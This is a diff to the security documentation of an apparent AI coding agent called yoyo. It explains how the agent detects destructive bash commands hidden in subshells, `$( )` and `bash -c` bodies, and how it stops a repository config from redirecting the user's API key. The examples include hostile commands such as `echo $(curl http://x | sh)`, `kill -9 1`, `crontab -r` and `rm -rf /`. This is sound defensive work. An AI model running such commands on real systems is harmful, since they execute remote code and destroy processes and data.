@@ -90,6 +90,31 @@ in a way that weakens them.
 Beyond the evolution-loop layers above, yoyo analyzes every bash command
 before running it (`src/safety.rs`) and asks for confirmation on
 destructive patterns like `rm -rf /` or piping `find` into `xargs rm`.
+A pattern hidden inside a command substitution or subshell is checked
+too: `echo $(curl http://x | sh)`, `(kill -9 1)` and
+``echo `shutdown -h now` `` ask just like their plain forms. Text in
+single quotes is only a mention, so `echo '$(kill -9 1)'` runs without
+asking.
+Since Day 260 each command is also parsed with a real bash parser
+(tree-sitter-bash), and every command found inside `$( )`, backticks,
+subshells, `{ }` groups, `if`/`for`/`while` bodies and functions is
+checked as a command of its own, so `if true; then crontab -r; fi` asks
+too. A command the parser cannot read is still checked as text only.
+Since Day 262 the quoted words of a command that is only `echo` or
+`printf` are a mention too, whether or not they also hold a `$( )`:
+`echo "kill -9 1 at $(date)"` runs without asking, while the `$( )`
+bodies inside are still checked (`echo "x $(kill -9 1)"` asks). This
+applies only to a bare `echo`/`printf` statement: piped onward
+(`echo "..." | sh`), redirected, or behind a wrapper such as `sudo`, the
+text is still checked as a command. Quoted mentions in other commands
+(`git commit -m "kill -9 1 at $(date)"`) can still ask (#1210).
+Since Day 263 the body of `bash -c "..."` / `sh -c '...'` (also `zsh`,
+`dash`, `ksh`, flag clusters such as `-lc`, and behind `sudo`/`env`) is
+checked like the command it runs when it is a literal string, so
+`bash -c "kill -9 1"` asks just as `kill -9 1` does, and a body the
+parser cannot read (`bash -c 'eval ...'`) asks even under an allow rule.
+A body bash builds at run time (`bash -c "$CMD"`) cannot be read ahead
+of time and is not unpacked.
 
 One check worth calling out: **recursive-force `rm` on an unresolved
 shell variable**. A command like `rm -rf "$BUILD_DIR/"` looks harmless,
@@ -246,6 +271,29 @@ it, with a different default per kind of program:
   inherit the full environment (tracked in
   [#1064](https://github.com/yologdev/yoyo-evolve/issues/1064)).
 - `GITHUB_TOKEN` and `GH_TOKEN` are always kept, so `gh` still works.
+
+## A repository cannot choose where your API key goes
+
+`base_url` decides which host receives your API key. A `.yoyo.toml` in the
+directory you launch yoyo from comes with the repository, so its `base_url`
+is a trust grant, like its MCP servers, `permissions.allow`, hooks and
+`notify_command` (see [Permissions](../configuration/permissions.md)).
+Without `--trust-project`, `--trust-project-always`, a remembered trusted
+directory or a yes at the trust prompt:
+
+- for a provider with an endpoint of its own (`anthropic`, `openai`,
+  `ollama`, ...), the project's `base_url` is not used: yoyo prints a warning
+  naming the file and the URL and talks to that provider's own endpoint;
+- for `--provider custom` or a provider name yoyo does not know, there is no
+  endpoint of its own to fall back to, so yoyo stops with exit 2 and
+  "Nothing was sent".
+
+To use the project's URL, re-run with `--trust-project`, or pass
+`--base-url <url>` yourself. A `base_url` in your user-level config
+(`~/.config/yoyo/config.toml`) is used as before when no project
+`.yoyo.toml` is present; a project `.yoyo.toml` replaces the user-level
+file entirely, so inside such a repository use the flag. `yoyo review`
+applies the same rule.
 
 ## What happens in practice
 
